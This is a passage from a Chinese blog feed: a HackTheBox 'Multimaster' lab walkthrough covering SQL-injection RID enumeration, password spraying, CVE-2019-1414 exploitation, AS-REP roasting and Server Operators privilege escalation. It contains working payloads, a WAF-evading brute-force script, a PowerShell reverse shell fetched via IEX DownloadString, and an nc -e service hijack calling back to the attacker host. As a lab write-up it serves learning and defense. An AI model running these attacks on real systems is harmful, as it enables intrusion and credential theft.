alt="image-20240724185429811"></p><p>这里就拿到了SID<code>的十六进制：</code>0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`</p><p>但是我们需要将这个16进制数据转换成<code>SID</code>格式，这里利用<code>python</code>脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_sid</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 去掉前缀 &quot;0x&quot; 和可能的空格</span></span><br><span class="line">    hex_str = hex_str.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节数组</span></span><br><span class="line">    byte_array = <span class="built_in">bytearray</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取第一个字节，它表示版本号</span></span><br><span class="line">    revision = byte_array[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二个字节表示标识符权限值的长度</span></span><br><span class="line">    sub_authority_count = byte_array[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接下来是6个字节的标识符权限值</span></span><br><span class="line">    identifier_authority = <span class="built_in">int</span>.from_bytes(byte_array[<span class="number">2</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 剩下的字节是子授权值</span></span><br><span class="line">    sub_authorities = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sub_authority_count):</span><br><span class="line">        sub_authority = <span class="built_in">int</span>.from_bytes(byte_array[<span class="number">8</span> + i*<span class="number">4</span>: <span class="number">12</span> + i*<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        sub_authorities.append(sub_authority)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组装SID字符串</span></span><br><span class="line">    sid = <span class="string">f&quot;S-<span class="subst">&#123;revision&#125;</span>-<span class="subst">&#123;identifier_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> sub_authority <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        sid += <span class="string">f&quot;-<span class="subst">&#123;sub_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sid</span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000&quot;</span></span><br><span class="line">sid = hex_to_sid(hex_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;SID: <span class="subst">&#123;sid&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724190101967-1037261460.png" alt="image-20240724190057434"></p><p>最后就获得了<code>SID</code>：<code>S-1-5-21-3167813660-1240564177-918740779-500</code></p><h2 id="枚举用户RID">枚举用户RID</h2><p>上一步获取了<code>Administertor</code>的<code>SID</code>，可以利用之前提到过的<code>SUSER_SNAME()</code>函数验证一下</p><p><code>a ' union select 1,2,3,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)),5 --</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724190903604-191476298.png" alt="image-20240724190858542"></p><p>验证没问题，并且知道<code>Administertor</code>的<code>RID</code>是<code>500</code></p><p>接下来就可以通过这个<code>RID</code>的值来爆破其他域用户名，这里使用<code>python</code>脚本来实现，但是要注意不要请求的太快，请求太快会被<code>waf</code>拦截，用<code>sleep</code>函数来达到延时访问的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># SID转16进制</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sid_to_hex</span>(<span class="params">sid_str</span>):</span><br><span class="line">    parts = sid_str[<span class="number">2</span>:].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    revision = <span class="built_in">int</span>(parts[<span class="number">0</span>])</span><br><span class="line">    identifier_authority = <span class="built_in">int</span>(parts[<span class="number">1</span>])</span><br><span class="line">    sub_authorities = [<span class="built_in">int</span>(part) <span class="keyword">for</span> part <span class="keyword">in</span> parts[<span class="number">2</span>:]]</span><br><span class="line">    hex_bytes = <span class="built_in">bytearray</span>([revision, <span class="built_in">len</span>(sub_authorities)])</span><br><span class="line">    hex_bytes.extend(identifier_authority.to_bytes(<span class="number">6</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> sub_authority <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        hex_bytes.extend(sub_authority.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + hex_bytes.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_escape</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="string">r&quot;\u&#123;:04x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=UTF-8&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://10.10.10.179/api/getColleagues&quot;</span></span><br><span class="line">sql = <span class="string">&quot;a&#x27; union select 1,2,3,(select SUSER_SNAME(&#123;&#125;)),5 --&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">10000</span>):</span><br><span class="line">    sid = <span class="string">&quot;S-1-5-21-3167813660-1240564177-918740779-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="built_in">str</span> = sid_to_hex(sid)</span><br><span class="line">    payload = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;&#x27;</span>+unicode_escape(sql.<span class="built_in">format</span>(<span class="built_in">str</span>))+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    r = requests.post(url, data=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> json.loads(r.text)[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>] :</span><br><span class="line">        <span class="built_in">print</span>(json.loads(r.text)[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>])</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>运行上述脚本等待一会儿，就可以得到该域内几乎全部的用户名，将用户名保存到文件<code>users.txt</code>中，顺便把<code>MEGACORP\</code>过滤掉</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">Domain Admins</span><br><span class="line">Domain Users</span><br><span class="line">Domain Guests</span><br><span class="line">Domain Computers</span><br><span class="line">Domain Controllers</span><br><span class="line">Cert Publishers</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Group Policy Creator Owners</span><br><span class="line">Read-only Domain Controllers</span><br><span class="line">Cloneable Domain Controllers</span><br><span class="line">Protected Users</span><br><span class="line">Key Admins</span><br><span class="line">Enterprise Key Admins</span><br><span class="line">RAS and IAS Servers</span><br><span class="line">Allowed RODC Password Replication Group</span><br><span class="line">Denied RODC Password Replication Group</span><br><span class="line">MULTIMASTER$</span><br><span class="line">DnsAdmins</span><br><span class="line">DnsUpdateProxy</span><br><span class="line">svc-nas</span><br><span class="line">Privileged IT Accounts</span><br><span class="line">tushikikatomo</span><br><span class="line">andrew</span><br><span class="line">lana</span><br><span class="line">alice</span><br><span class="line">test</span><br><span class="line">dai</span><br><span class="line">svc-sql</span><br><span class="line">SQLServer2005SQLBrowserUser$MULTIMASTER</span><br><span class="line">sbauer</span><br><span class="line">okent</span><br><span class="line">ckane</span><br><span class="line">kpage</span><br><span class="line">james</span><br><span class="line">cyork</span><br><span class="line">rmartin</span><br><span class="line">zac</span><br><span class="line">jorden</span><br><span class="line">alyx</span><br><span class="line">ilee</span><br><span class="line">nbourne</span><br><span class="line">zpowers</span><br><span class="line">aldom</span><br><span class="line">jsmmons</span><br><span class="line">pmartin</span><br><span class="line">Developers</span><br></pre></td></tr></table></figure><h2 id="二次密码喷洒登录tushikikatomo">二次密码喷洒登录tushikikatomo</h2><p>用刚得到的用户名以及密码进行密码喷洒</p><p><code>crackmapexec smb 10.10.10.179 -u users.txt -p passwds</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724212704923-13932621.png" alt="image-20240724212700281"></p><p>最后也是在漫长的等待中，找到了正确的用户名和密码，在查看一下能否<code>winrm</code>登录</p><p><code>crackmapexec winrm 10.10.10.179 -u tushikikatomo -p finance1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724212837921-732608447.png" alt="image-20240724212832989"></p><p>可以登录，直接登录该用户</p><p><code>evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724213111085-1525432495.png" alt="image-20240724213106549"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724213155442-1793569265.png" alt="image-20240724213150692"></p><p>最后在<code>Desktop</code>目录下找到<code>user.txt</code></p><h1>横向移动</h1><h2 id="bloodhound信息搜集">bloodhound信息搜集</h2><p>先使用<code>bloodhound</code>进行信息搜集，看看能不能有有价值的信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725102932070-1881559902.png" alt="image-20240725102923819"></p><p>发现还有很多其他用户，但是没找到什么其他信息</p><p>还是去翻翻文件夹吧</p><p>也是翻了好久，最后在<code>Program Files</code>文件夹中，发现一堆应用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725111221575-575415943.png" alt="image-20240725111210668"></p><p>再看下进程看看那些应用在运行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725112503342-1413852341.png" alt="image-20240725112455699"></p><p>发现在最上面运行着一堆<code>Code</code>进程，猜测跟<code>VSCode</code>应用有关，确认一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240726103348474-1758824233.png" alt="image-20240726103345887"></p><p>发现确实是该应用，看看该应用的版本</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240726104232227-713737.png" alt="image-20240726104229382"></p><p>在<code>C:\Program Files\Microsoft VS Code\resources\app</code>目录下找到<code>package.json</code></p><p>在网上搜索该版本是否有漏洞，发现如下结果</p><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414">CVE-2019-1414</a></li></ul><h2 id="CVE-2019-1414登录cyork">CVE-2019-1414登录cyork</h2><blockquote><p>当 Visual Studio Code 向本地计算机的用户公开调试侦听器时，它会存在特权提升漏洞。成功利用此漏洞的本地攻击者可以注入任意代码以在当前用户的上下文中运行。如果当前用户使用管理用户权限登录，则攻击者可以控制受影响的系统。<br><a href="https://iwantmore.pizza/posts/cve-2019-1414.html">详细利用方法</a></p></blockquote><p>使用工具<a href="https://github.com/taviso/cefdebug">cefdebug</a>可以利用这个漏洞</p><p>先将工具下载到本地，再将<code>cefdebug.exe</code>传到机器上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093323214-1165219866.png" alt="image-20240729093308415"></p><p>运行该文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093355745-1571258238.png" alt="image-20240729093341288"></p><p>扫描本地机器并成功获得了三个 <code>CEF</code> 调试器，随便找一个通过代码来验证</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cefdebug.exe --url ws://127.0.0.1:22048/43667936-2666-4f67-898b-5d4a75cd2f4a --code <span class="string">&quot;process.version&quot;</span> </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093416362-1657600438.png" alt="image-20240729093401071"></p><p>验证成功，发现可以执行命令，接下来就可以利用这个获取一个<code>shell</code></p><p>拿下面的<code>powershell</code>命令反弹<code>shell</code>，先将该命令保存为<code>shell.ps1</code>至本地</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;10.10.14.3&quot;</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">8888</span></span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="variable">$ip</span>, <span class="variable">$port</span>)</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream()</span><br><span class="line"><span class="variable">$writer</span> = <span class="built_in">New-Object</span> System.IO.StreamWriter(<span class="variable">$stream</span>)</span><br><span class="line"><span class="variable">$reader</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="variable">$stream</span>)</span><br><span class="line"><span class="variable">$buffer</span> = <span class="built_in">New-Object</span> byte[] <span class="number">1024</span></span><br><span class="line"><span class="variable">$writer</span>.WriteLine(<span class="string">&quot;Shell connected!&quot;</span>)</span><br><span class="line"><span class="variable">$writer</span>.Flush()</span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$input</span> = <span class="variable">$reader</span>.ReadLine()) <span class="operator">-ne</span> <span class="string">&quot;exit&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$output</span> = (<span class="built_in">Invoke-Expression</span> <span class="variable">$input</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span>)</span><br><span class="line">    <span class="variable">$writer</span>.WriteLine(<span class="variable">$output</span>)</span><br><span class="line">    <span class="variable">$writer</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>在<code>kali</code>开启监听，同时开启<code>http</code>服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>最后使用<code>cefdebug.exe</code>运行 <code>CEF</code> 调试器的服务器执行反弹 <code>shell</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\cefdebug.exe <span class="literal">--url</span> ws://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">22048</span>/<span class="number">43667936</span><span class="literal">-2666-4f67-898b-5d4a75cd2f4a</span> <span class="literal">--code</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;powershell IEX(New-Object Net.WebClient).DownloadString(\&#x27;http://10.10.14.3/shell.ps1\&#x27;)&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>该命令将文件下载并执行而不是将文件传到机器上并执行，这样就绕过了本地的脚本执行策略</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093447413-368288370.png" alt="image-20240729093432988"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093520842-1996459293.png" alt="image-20240729093506601"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093507850-881670073.png" alt="image-20240729093453671"></p><p>这时我们就拿到了<code>cyork</code>用户的权限</p><h2 id="SMB传输敏感文件">SMB传输敏感文件</h2><p>测试后发现<code>cyork</code>用户可以访问 <code>C:\inetpub\wwwroot\bin</code>目录，之前的用户访问是不行的</p><p>在这里发现了一些<code>dll</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729094451423-1978565072.png" alt="image-20240729094436832"></p><p>这里注意到有一个名为<code>MultimasterAPI.dll</code>的<code>DLL</code></p><p>尝试利用<code>SMB</code>共享将文件下载下来</p><p>首先使用 <code>smbserver.py</code>建立一个共享服务器</p><p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729100527970-1961370175.png" alt="image-20240729100513542"></p><p>在靶机上执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\10.10.14.3\share</span><br><span class="line">copy MultimasterAPI.dll x:</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104103094-1081529091.png" alt="image-20240729104048727"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104200842-1329366775.png" alt="image-20240729104143310"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104217347-1563767963.png" alt="image-20240729104203181"></p><p>此时发现已经将文件下载到本地了</p><h2 id="逆向分析dll文件获取密码">逆向分析dll文件获取密码</h2><p>分析一下是什么文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729105646125-1589069605.png" alt="image-20240729105631937"></p><p>发现是<code>.NET</code>文件，用<code>dnSpy</code>工具分析</p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729110245688-624518175.png" alt="image-20240729110231243"></p><p>最后发现密码<code>D3veL0pM3nT!</code></p><h2 id="三次密码喷洒登录sbauer">三次密码喷洒登录sbauer</h2><p>熟悉的密码，熟悉的用户名列表，再次进行密码喷洒。这次的用户名列表和第一次的一样</p><p><code>crackmapexec smb 10.10.10.179 -u users -p D3veL0pM3nT!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729111508437-1929996575.png" alt="image-20240729111442645"></p><p>再验证一下可不可以登录</p><p><code>crackmapexec winrm 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729112326611-1209904571.png" alt="image-20240729112311645"></p><p>可以远程登录，直接登录</p><p><code>evil-winrm -i 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729112737022-1061168092.png" alt="image-20240729112710433"></p><p>登录成功，但是发现没什么可以直接利用能够提权的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729135847596-1147621995.png" alt="image-20240729135821896"></p><h2 id="bloodhound二次信息搜集">bloodhound二次信息搜集</h2><p>现在我们已经拿下了三个用户，分别是<code>tushikikatomo</code>、<code>cyork</code>、<code>sbauer</code></p><p>在<code>bloodhound</code>中将他们标记为已经拿下的用户，然后点击<code>Shortest Paths to High Value Targets</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729114754648-851746975.png" alt="image-20240729114739900"></p><p>看着就好复杂，但是仔细看会发现很多重要的信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729114950277-1415659020.png" alt="image-20240729114935752"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730173507194-1884458758.png" alt="image-20240730173454585"></p><p>仔细看会发现<code>sbauer</code>用户和<code>jorden</code>用户有<code>GenericWrite</code>关系，并且<code>jorden</code>用户属于<code>SERVER_OPERATORS</code>组（高权限组），我们可以试试能否通过滥用<code>GenericWrite</code>权限实现横向移动</p><h2 id="滥用GenericWrite权限横移登录jorden">滥用GenericWrite权限横移登录jorden</h2><blockquote><p>先看看之前提到的 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户破解密码哈希的技术。事实上，如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。</p></blockquote><p>可以使用下面这条命令来为<code>jorden</code>用户设置“不需要 <code>Kerberos</code> 预身份验证”的属性</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> jorden | <span class="built_in">Set-ADAccountControl</span> <span class="literal">-doesnotrequirepreauth</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730173952758-9402141.png" alt="image-20240730173951299"></p><p>使用<code>impactet</code>下的<code>GetNPUsers</code>脚本来获取<code>jorden</code>用户的<code>AS-REP</code>票据</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730174416438-495478340.png" alt="image-20240730174414913"></p><p>这样就获取到了<code>AS-REP</code>票据，将上述票据保存至文件<code>hash</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$jorden@MEGACORP.LOCAL:6127c87770a9aed57005d987e2818bd2$b6a67b254f3670033f7f32d0da0a98deae8f8dbbbd71917d7e27b9ef57ff4a394af9046f1a7673137568f7572276cfaad5af44c4def95bdadeaca1dbbe31fce3c9414823286c8a8a350b7bddce823eb93d4289a49d1e8dae1654ee01cc64d744a088c9723bc5183c0a8d0128b9b394973cbdf7051400953c5e9c6250c191c020ad1bb13615a6a60f02539b169280384e47f5049f8ccc8f9c882918c7d740044118ef07d521344784d8717fb6f6223bdffd341d7334e50e184dfb3c390913381725c7bec1a212fa0a148287bebe6cac9c114974b08bc658c3acfc61ad18ade1bc1d9419790395ef5b16edc5e2145e11d0</span><br></pre></td></tr></table></figure><p>使用<code>john</code>尝试破解获取明文密码</p><p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730174813435-1439858535.png" alt="image-20240730174800662"></p><p>得到<code>jorden</code>用户的明文密码：<code>rainforest786</code></p><p>利用<code>crackmapexec</code>验证是否能够远程登录</p><p><code>crackmapexec winrm 10.10.10.179 -u jorden -p 'rainforest786'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730175140880-587706820.png" alt="image-20240730175138971"></p><p>可以登录，直接利用<code>evil-winrm</code>登录</p><p><code>evil-winrm -i 10.10.10.179 -u jorden -p 'rainforest786'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730175305311-1791317928.png" alt="image-20240730175303829"></p><p>登陆成功</p><h1>AD域提权</h1><h2 id="信息搜集">信息搜集</h2><p>先看一下该用户所拥有的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730180856080-662594263.png" alt="image-20240730180854225"></p><p>之前在<code>bloodhound</code>中提到过该用户属于<code>SERVER_OPERATORS</code>组（高权限组）</p><blockquote><p>Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。</p></blockquote><p>所以可以尝试利用一下该组权限</p><h2 id="滥用Server-Operators组权限实现权限提升">滥用Server Operators组权限实现权限提升</h2><ul><li>利用思路</li></ul><blockquote><p>可以找系统服务，将其执行改写，比如我让他去执行nc为我机器建立一个反向连接的shell，然后将服务重启，那么系统便会加载该服务并建立一个反向连接的shell给我的机器，该shell应该是系统级别的。</p></blockquote><p>首先通过<code>upload</code>将``nc64.exe传上去</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730181748748-1462306931.png" alt="image-20240730181747343"></p><p>经过多次测试后发现可以改变<code>browser</code>服务的路径</p><p><code>sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183323514-296023642.png" alt="image-20240730183321829"></p><p>先在<code>kali</code>中设置监听</p><p><code>nc -lvp 80</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183429220-759850834.png" alt="image-20240730183427653"></p><p>然后在靶机中手动重启<code>browser</code>服务</p><p><code>sc.exe stop browser</code></p><p><code>sc.exe start browser</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183808518-2033487681.png" alt="image-20240730183806758"></p><p>此时<code>kali</code>中收到回显</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730184223527-981482744.png" alt="image-20240730184218688"></p><p>发现已经是<code>system</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193239799-1215521076.png" alt="image-20240730193237991"></p><p>最后在<code>C:\Users\Administrator\Desktop</code>目录下找到<code>root.txt</code></p><h1>其他提权方法</h1><h2 id="SeBackupPrivilege和SeRestorePrivilege权限的滥用">SeBackupPrivilege和SeRestorePrivilege权限的滥用</h2><p>在对<code>jorden</code>用户信息搜集的时候，发现如下内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193338002-1111181364.png" alt="image-20240730193320821"></p><p>发现该用户具有<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>权限</p><p>有了<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>这两个权限，就可以用<code>robocopy</code>来读取文件</p><p><code>robocopy /b C:\users\administrator\desktop C:\Users\jorden\Documents</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193636356-418270461.png" alt="image-20240730193634029"></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Multimaster</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Cascade</title>
    <link href="https://www.fomal.cc/posts/7112d8f8.html"/>
